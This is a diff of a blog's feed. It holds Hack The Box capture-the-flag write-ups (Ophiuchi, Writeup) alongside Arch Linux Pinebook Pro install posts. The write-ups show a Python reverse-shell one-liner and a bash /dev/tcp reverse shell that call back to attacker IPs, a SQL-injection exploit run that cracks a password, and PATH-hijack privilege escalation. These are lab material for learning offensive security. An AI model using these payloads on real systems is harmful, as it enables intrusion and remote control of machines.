+Receiving objects: 100% (29666/29666), 20.83 MiB | 269.00 KiB/s, done.
+Resolving deltas: 100% (23736/23736), done.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Since we’ve got the credentials to the &lt;code class=&quot;highlighter-rouge&quot;&gt;admin&lt;/code&gt; user, it’s convenient enough to just &lt;code class=&quot;highlighter-rouge&quot;&gt;scp&lt;/code&gt;  &lt;code class=&quot;highlighter-rouge&quot;&gt;main.wasm&lt;/code&gt; to our local machine to decompile. Once we’ve done so &lt;code class=&quot;highlighter-rouge&quot;&gt;~/Tools/wabt/bin/wasm2wat ~/main.wasm &amp;gt; ~/main.wat&lt;/code&gt; yeilds the following web assembly code.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-WebAssembly&quot;&gt;(module
+  (type (;0;) (func (result i32)))
+  (func $info (type 0) (result i32)
+    i32.const 0)
+  (table (;0;) 1 1 funcref)
+  (memory (;0;) 16)
+  (global (;0;) (mut i32) (i32.const 1048576))
+  (global (;1;) i32 (i32.const 1048576))
+  (global (;2;) i32 (i32.const 1048576))
+  (export &quot;memory&quot; (memory 0))
+  (export &quot;info&quot; (func $info))
+  (export &quot;__data_end&quot; (global 1))
+  (export &quot;__heap_base&quot; (global 2)))
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;After more trial and error than I’d care to admit, it is determined that all we’ve got to do is change &lt;code class=&quot;highlighter-rouge&quot;&gt;i32.const&lt;/code&gt; to be &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt;, and the file becomes.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-WebAssembly&quot;&gt;(module
+  (type (;0;) (func (result i32)))
+  (func $info (type 0) (result i32)
+    i32.const 1)
+  (table (;0;) 1 1 funcref)
+  (memory (;0;) 16)
+  (global (;0;) (mut i32) (i32.const 1048576))
+  (global (;1;) i32 (i32.const 1048576))
+  (global (;2;) i32 (i32.const 1048576))
+  (export &quot;memory&quot; (memory 0))
+  (export &quot;info&quot; (func $info))
+  (export &quot;__data_end&quot; (global 1))
+  (export &quot;__heap_base&quot; (global 2)))
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;We finish up by rebuilding &lt;code class=&quot;highlighter-rouge&quot;&gt;main.wasm&lt;/code&gt; via &lt;code class=&quot;highlighter-rouge&quot;&gt;~/Tools/wabt/bin/wat2wasm ~/main.wat &amp;gt; ~/main.wasm&lt;/code&gt;, and use &lt;code class=&quot;highlighter-rouge&quot;&gt;scp&lt;/code&gt; once more to get it back on the machine.&lt;br /&gt;
+&lt;img src=&quot;/wp-content/uploads/2021/07/ophiuchi/recompile.png&quot; alt=&quot;recompile&quot; /&gt;&lt;br /&gt;
+&lt;strong&gt;Figure 11:&lt;/strong&gt; After modifying &lt;code class=&quot;highlighter-rouge&quot;&gt;i32.const&lt;/code&gt; to be equal &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt;, we place &lt;code class=&quot;highlighter-rouge&quot;&gt;main.wasm&lt;/code&gt; back onto the victim machine.&lt;/p&gt;
+
+&lt;p&gt;Next, we ssh back into the box as &lt;code class=&quot;highlighter-rouge&quot;&gt;admin&lt;/code&gt;. We’ll navigate to the &lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp&lt;/code&gt; directory and create our own &lt;code class=&quot;highlighter-rouge&quot;&gt;deploy.sh&lt;/code&gt; to call our reverse shell. Since we know port &lt;code class=&quot;highlighter-rouge&quot;&gt;8081&lt;/code&gt; worked last time, we’ll use that again (make sure the old listener used to catch the foothold is reset). The reverse shell payload will be the following python payload.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;python3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.3&quot;,8081));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2021/07/ophiuchi/deploy_sh.png&quot; alt=&quot;deploy_sh&quot; /&gt;&lt;br /&gt;
+&lt;strong&gt;Figure 12:&lt;/strong&gt; SSH back in and create a malicious &lt;code class=&quot;highlighter-rouge&quot;&gt;deploy.sh&lt;/code&gt; to call a reverse shell.&lt;/p&gt;
+
+&lt;p&gt;To gain root privileges we’ll do what we know we’re allowed to do which is &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo /usr/bin/go run /opt/wasm-functions/index.go&lt;/code&gt;, and as you can see below netcat has caught the root reverse shell.&lt;br /&gt;
+&lt;img src=&quot;/wp-content/uploads/2021/07/ophiuchi/rooted.png&quot; alt=&quot;rooted&quot; /&gt;&lt;br /&gt;
+&lt;strong&gt;Figure 13:&lt;/strong&gt; Root achieved via &lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp&lt;/code&gt; directory containing our own &lt;code class=&quot;highlighter-rouge&quot;&gt;deploy.sh&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;main.wasm&lt;/code&gt; files.&lt;/p&gt;
+
+&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;
+&lt;p&gt;Knowing very little about Golang, and even less about WebAssembly, made the privilege escalation to root a real bastard for me. It was a great learning experience to decompile and recompile WebAssembly code. The box overall was extremely enjoyable (but I still am not sure how to pronounce the name).&lt;/p&gt;
+
+&lt;h1 id=&quot;references&quot;&gt;References&lt;/h1&gt;
+&lt;ol&gt;
+  &lt;li&gt;&lt;a href=&quot;https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858&quot;&gt;https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/artsploit/yaml-payload&quot;&gt;https://github.com/artsploit/yaml-payload&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/artsploit/yaml-payload/issues/3&quot;&gt;https://github.com/artsploit/yaml-payload/issues/3&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/WebAssembly/wabt&quot;&gt;https://github.com/WebAssembly/wabt&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;</content><author><name>Ryan Kozak</name></author><category term="CTF Writeup" /><category term="Security" /><category term="CTF" /><category term="Hack The Box" /><category term="Linux" /><category term="WebAssembly" /><category term="Golang" /><category term="java" /><category term="SnakeYAML" /><summary type="html"></summary></entry><entry><title type="html">Installing Arch Linux on the Pinebook Pro with LUKS Encrypted Root…Again</title><link href="http://0.0.0.0:4000/luks-encrypted-arch-linux-on-pinebook-pro-again/" rel="alternate" type="text/html" title="Installing Arch Linux on the Pinebook Pro with LUKS Encrypted Root…Again" /><published>2021-06-28T00:00:00+00:00</published><updated>2021-06-28T18:28:30+00:00</updated><id>http://0.0.0.0:4000/luks-encrypted-arch-linux-on-pinebook-pro-again</id><content type="html" xml:base="http://0.0.0.0:4000/luks-encrypted-arch-linux-on-pinebook-pro-again/">&lt;p&gt;In my &lt;a href=&quot;/luks-encrypted-arch-linux-on-pinebook-pro/&quot;&gt;previous post&lt;/a&gt; I went through the steps I used to install Arch Linux on my Pinebook Pro with a LUKS encrypted root partition. It appears that the repositories used in that post have been retired, and the packages hosted at &lt;em&gt;https://nhp.sh/pinebookpro/&lt;/em&gt; are no longer there. A big thanks to &lt;a href=&quot;https://github.com/nadiaholmquist&quot;&gt;Nadia Holmquist Pedersen&lt;/a&gt; for all the work she’s done for Arch on the Pinebook Pro.&lt;/p&gt;
 
 &lt;p&gt;The following instructions use &lt;a href=&quot;https://kiljan.org/&quot;&gt;Sven Kiljan’s&lt;/a&gt; project. You can find his blog post discussing it &lt;a href=&quot;https://kiljan.org/2021/06/20/arch-linux-arm-on-a-pinebook-pro/&quot;&gt;here&lt;/a&gt;, and the GitHub repository &lt;a href=&quot;https://github.com/SvenKiljan/archlinuxarm-pbp/&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
 
@@ -103,7 +328,7 @@
   &lt;li&gt;&lt;a href=&quot;https://forum.pine64.org/showthread.php?tid=14238&quot;&gt;https://forum.pine64.org/showthread.php?tid=14238&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;https://ryankozak.com/luks-encrypted-arch-linux-on-pinebook-pro/&quot;&gt;https://ryankozak.com/luks-encrypted-arch-linux-on-pinebook-pro/&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;https://rudism.com/pinebook-pro-arch-linux-alternative/&quot;&gt;https://rudism.com/pinebook-pro-arch-linux-alternative/&lt;/a&gt;&lt;/li&gt;
-&lt;/ol&gt;</content><author><name>Ryan Kozak</name></author><category term="Linux" /><category term="Pinebook Pro" /><category term="linux" /><category term="Arch Linux" /><category term="Pinebook Pro" /><summary type="html">In my previous post I went through the steps I used to install Arch Linux on my Pinebook Pro with a LUKS encrypted root partition. It appears that the repositories used in that post have been retired, and the packages hosted at https://nhp.sh/pinebookpro/ are no longer there. A big thanks to Nadia Holmquist Pedersen for all the work she’s done for Arch on the Pinebook Pro.</summary></entry><entry><title type="html">Installing Arch Linux on the Pinebook Pro with LUKS Encrypted Root</title><link href="http://0.0.0.0:4000/luks-encrypted-arch-linux-on-pinebook-pro/" rel="alternate" type="text/html" title="Installing Arch Linux on the Pinebook Pro with LUKS Encrypted Root" /><published>2020-12-15T00:00:00+00:00</published><updated>2021-06-23T16:11:24+00:00</updated><id>http://0.0.0.0:4000/luks-encrypted-arch-linux-on-pinebook-pro</id><content type="html" xml:base="http://0.0.0.0:4000/luks-encrypted-arch-linux-on-pinebook-pro/">&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2020/12/pinebook_arch.png&quot; alt=&quot;Pinebook Pro Running Arch&quot; /&gt;&lt;/p&gt;
+&lt;/ol&gt;</content><author><name>Ryan Kozak</name></author><category term="Linux" /><category term="Pinebook Pro" /><category term="linux" /><category term="Arch Linux" /><category term="Pinebook Pro" /><summary type="html">In my previous post I went through the steps I used to install Arch Linux on my Pinebook Pro with a LUKS encrypted root partition. It appears that the repositories used in that post have been retired, and the packages hosted at https://nhp.sh/pinebookpro/ are no longer there. A big thanks to Nadia Holmquist Pedersen for all the work she’s done for Arch on the Pinebook Pro.</summary></entry><entry><title type="html">Installing Arch Linux on the Pinebook Pro with LUKS Encrypted Root</title><link href="http://0.0.0.0:4000/luks-encrypted-arch-linux-on-pinebook-pro/" rel="alternate" type="text/html" title="Installing Arch Linux on the Pinebook Pro with LUKS Encrypted Root" /><published>2020-12-15T00:00:00+00:00</published><updated>2021-06-28T18:28:30+00:00</updated><id>http://0.0.0.0:4000/luks-encrypted-arch-linux-on-pinebook-pro</id><content type="html" xml:base="http://0.0.0.0:4000/luks-encrypted-arch-linux-on-pinebook-pro/">&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2020/12/pinebook_arch.png&quot; alt=&quot;Pinebook Pro Running Arch&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;My Pinebook Pro came in last week and yesterday I finally got a chance to really play with it. The first thing I wanted to do was get Arch installed on it with an encrypted root partition. I need these notes as a reference to use the next time I do this, so I figured I’d post them up to help anyone else out that may be trying to achieve the same thing. This post ignores post installation configuration. It just gets you booting into the terminal of your LUKS encrypted partition. From there it’s up to you to setup users, install your desktop manager, etc.&lt;/p&gt;
 
@@ -1940,149 +2165,4 @@ filter {
   &lt;li&gt;&lt;a href=&quot;https://www.cyberark.com/threat-research-blog/execute-this-i-know-you-have-it/&quot;&gt;https://www.cyberark.com/threat-research-blog/execute-this-i-know-you-have-it/&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;https://www.anquanke.com/post/id/168291&quot;&gt;https://www.anquanke.com/post/id/168291&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;https://grokdebug.herokuapp.com/&quot;&gt;https://grokdebug.herokuapp.com/&lt;/a&gt;&lt;/li&gt;
-&lt;/ol&gt;</content><author><name>Ryan Kozak</name></author><category term="CTF Writeup" /><category term="Security" /><category term="CTF" /><category term="Hack The Box" /><category term="Linux" /><category term="Privilege Escalation" /><category term="PHP" /><category term="Elasticsearch" /><category term="ELK" /><summary type="html"></summary></entry><entry><title type="html">Hack The Box - Writeup</title><link href="http://0.0.0.0:4000/hack-the-box-writeup-4-writeup/" rel="alternate" type="text/html" title="Hack The Box - Writeup" /><published>2019-10-19T00:00:00+00:00</published><updated>2021-06-23T16:11:24+00:00</updated><id>http://0.0.0.0:4000/hack-the-box-writeup</id><content type="html" xml:base="http://0.0.0.0:4000/hack-the-box-writeup-4-writeup/">&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/07/writeup/badge.png&quot; alt=&quot;Hack The Box Writeup&quot; /&gt;&lt;/p&gt;
-
-&lt;h1 id=&quot;information-gathering&quot;&gt;Information Gathering&lt;/h1&gt;
-
-&lt;h2 id=&quot;nmap&quot;&gt;Nmap&lt;/h2&gt;
-&lt;p&gt;We begin our reconnaissance by running an Nmap scan checking default scripts and testing for vulnerabilities.&lt;/p&gt;
-
-&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:/media/sf_Research#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sVC&lt;/span&gt; 10.10.10.138
-&lt;span class=&quot;go&quot;&gt;Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-17 20:23 EDT
-Nmap scan report for 10.10.10.138
-Host is up (0.37s latency).
-Not shown: 998 filtered ports
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
-| ssh-hostkey:
-|   2048 dd:53:10:70:0b:d0:47:0a:e2:7e:4a:b6:42:98:23:c7 (RSA)
-|   256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA)
-|_  256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519)
-80/tcp open  http    Apache httpd 2.4.25 ((Debian))
-| http-robots.txt: 1 disallowed entry
-|_/writeup/
-|_http-server-header: Apache/2.4.25 (Debian)
-|_http-title: Nothing here yet.
-&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;Service Info: OS: Linux;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;CPE: cpe:/o:linux:linux_kernel
-&lt;span class=&quot;go&quot;&gt;
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 41.22 seconds
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;From the above output we can see that ports, &lt;strong&gt;22&lt;/strong&gt; and &lt;strong&gt;80&lt;/strong&gt; are the only ports open. It also appears as though there’s a &lt;code class=&quot;highlighter-rouge&quot;&gt;robots.txt&lt;/code&gt; file disallowing a directory called &lt;code class=&quot;highlighter-rouge&quot;&gt;/writeup&lt;/code&gt; on the web server.&lt;/p&gt;
-
-&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:/media/sf_Research#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;curl http://10.10.10.138/robots.txt
-&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;              &lt;/span&gt;__
-&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;      &lt;/span&gt;_&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;   |@@|
-&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;__/&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_ &lt;span class=&quot;se&quot;&gt;\-&lt;/span&gt;-/ __
-&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__|----|  |   __
-&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;            &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}{&lt;/span&gt; /&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;_ / _&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;#            /\__/\ \__O (__&lt;/span&gt;
-&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;           &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;/&lt;span class=&quot;se&quot;&gt;\-&lt;/span&gt;-&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;    &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_/
-&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;           &lt;/span&gt;_&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;_
-&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;          &lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
-&lt;span class=&quot;go&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;Disallow access to the blog &lt;span class=&quot;k&quot;&gt;until &lt;/span&gt;content is finished.
-&lt;span class=&quot;go&quot;&gt;User-agent: *
-Disallow: /writeup/
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/07/writeup/main_80.png&quot; alt=&quot;Index of port 80&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Running some directory enumeration tools on the main web port didn’t turn up anything interesting. The page indicates that the site isn’t ready yet, but contains various articles on Hack The Box writeups. When we navigate to the &lt;code class=&quot;highlighter-rouge&quot;&gt;/writeup&lt;/code&gt; directory we see that this is where the CMS root directory is located.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/07/writeup/cms.png&quot; alt=&quot;/writeup running directory CMS Made Simple&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;We can determine that the site is running &lt;a href=&quot;https://www.cmsmadesimple.org/&quot;&gt;CMS Made Simple&lt;/a&gt;. This can be done by checking the source code, but in my case the Firefox extension &lt;a href=&quot;https://www.wappalyzer.com/&quot;&gt;Webappalyzer&lt;/a&gt; indicated such. After browsing unauthenticated exploits for the CMS we come across one that works perfectly &lt;a href=&quot;https://www.exploit-db.com/exploits/46635&quot;&gt;https://www.exploit-db.com/exploits/46635&lt;/a&gt;.&lt;/p&gt;
-
-&lt;h1 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h1&gt;
-
-&lt;p&gt;In order to gain our initial foothold we execute the exploit with the &lt;code class=&quot;highlighter-rouge&quot;&gt;rockyou.txt&lt;/code&gt; worldlist in order for it to crack the hashed password.&lt;/p&gt;
-
-&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~/Desktop#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;python cmsmadesimple22-sql.py &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://10.10.10.138/writeup &lt;span class=&quot;nt&quot;&gt;--crack&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/rockyou.txt
-&lt;span class=&quot;go&quot;&gt;
-[+] Salt for password found: 5a599ef579066807
-[+] Username found: jkr
-[+] Email found: jkr@writeup.htb
-[+] Password found: 62def4866937f08cc13bab43bb14e6f7
-[+] Password cracked: raykayjay9
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;While some users on the forum indicated the need to adjust their system time in order for this exploit to function, I did not have to do anything of that nature. The exploit returned the above the first time it was run, and then again when I rerooted the box for the purposes of this writeup.&lt;/p&gt;
-
-&lt;p&gt;The username and password did not provide access to the backend of the CMS. They do, however, provide us ssh access to the box.&lt;/p&gt;
-
-&lt;h2 id=&quot;user-flag&quot;&gt;User Flag&lt;/h2&gt;
-
-&lt;p&gt;In order to get the user flag, we simply need to ssh into the box and move to the home directory of the &lt;code class=&quot;highlighter-rouge&quot;&gt;jkr&lt;/code&gt; user.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jkr@10.10.10.138's password:
-Linux writeup 4.9.0-8-amd64 x86_64 GNU/Linux
-
-The programs included with the Devuan GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-Last login: Thu Jun 20 19:17:35 2019 from 10.10.14.157
-jkr@writeup:~$ pwd
-/home/jkr
-jkr@writeup:~$ ls -la
-total 72
-drwxr-xr-x 2 jkr  jkr   4096 Jun 20 19:10 .
-drwxr-xr-x 3 root root  4096 Apr 19 04:14 ..
--r--r--r-- 1 root root    33 Apr 19 08:43 user.txt
-jkr@writeup:~$ cat user.txt
-d4e493fd4068afc9eb1aa6a55319f978
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;root-flag&quot;&gt;Root Flag&lt;/h2&gt;
-
-&lt;p&gt;The privilege escalation for this box was not as immediately apparent to me as it was on SwagShop. Running &lt;a href=&quot;https://github.com/diego-treitos/linux-smart-enumeration&quot;&gt;Linux Smart Enumeration&lt;/a&gt; did not return anything very useful for me. Some users on the forum indicated using a tool called &lt;a href=&quot;https://github.com/DominicBreuker/pspy&quot;&gt;Pspy&lt;/a&gt;. This tool allows us to “Monitor Linux processes without root permissions”. After running this script for a while something interesting appears when other users access the box via ssh.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/07/writeup/pyspy.png&quot; alt=&quot;output from pyspy&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;PATH&lt;/code&gt; variable contains a directory &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/local/sbin&lt;/code&gt; as its first priority.&lt;/p&gt;
-
-&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;jkr@writeup:~$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /usr/local/
-&lt;span class=&quot;gp&quot;&gt;jkr@writeup:/usr/local$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
-&lt;span class=&quot;go&quot;&gt;total 64
-drwxrwsr-x 10 root staff  4096 Apr 19 04:11 .
-drwxr-xr-x 10 root root   4096 Apr 19 04:11 ..
-drwx-wsr-x  2 root staff 20480 Apr 19 04:11 bin
-drwxrwsr-x  2 root staff  4096 Apr 19 04:11 etc
-drwxrwsr-x  2 root staff  4096 Apr 19 04:11 games
-drwxrwsr-x  2 root staff  4096 Apr 19 04:11 include
-drwxrwsr-x  4 root staff  4096 Apr 24 13:13 lib
-&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;lrwxrwxrwx  1 root staff     9 Apr 19 04:11 man -&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;share/man
-&lt;span class=&quot;go&quot;&gt;drwx-wsr-x  2 root staff 12288 Apr 19 04:11 sbin
-drwxrwsr-x  7 root staff  4096 Apr 19 04:30 share
-drwxrwsr-x  2 root staff  4096 Apr 19 04:11 src
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;As we see above, we also have access to write to and execute scripts from the &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/local/sbin&lt;/code&gt; directory. This means that we can create our own &lt;code class=&quot;highlighter-rouge&quot;&gt;run-parts&lt;/code&gt; to execute other scripts as root. So lets do that.&lt;/p&gt;
-
-&lt;p&gt;First we create a script to call our reverse shell, because adding the reverse shell directly to &lt;code class=&quot;highlighter-rouge&quot;&gt;run-parts&lt;/code&gt; didn’t seem to be doing the trick.&lt;/p&gt;
-
-&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;jkr@writeup:/usr/local/sbin$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;nano shelly.sh &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x shelly.sh
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Here is what &lt;code class=&quot;highlighter-rouge&quot;&gt;shelly.sh&lt;/code&gt; contains.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/sh  &lt;/span&gt;
-bash &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;amp; /dev/tcp/10.10.14.52/4444 0&amp;gt;&amp;amp;1
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Next we actually create the &lt;code class=&quot;highlighter-rouge&quot;&gt;run-parts&lt;/code&gt; script within &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/local/sbin&lt;/code&gt; so that it calls &lt;code class=&quot;highlighter-rouge&quot;&gt;shelly.sh&lt;/code&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;jkr@writeup:/usr/local/sbin$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;nano run-parts &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x run-parts
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;When we ssh in again from another terminal, we’ll get our reverse shell with root privileges.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/07/writeup/rooted.png&quot; alt=&quot;tmux screenshot of achieving root privileges&quot; /&gt;&lt;/p&gt;
-
-&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;
-
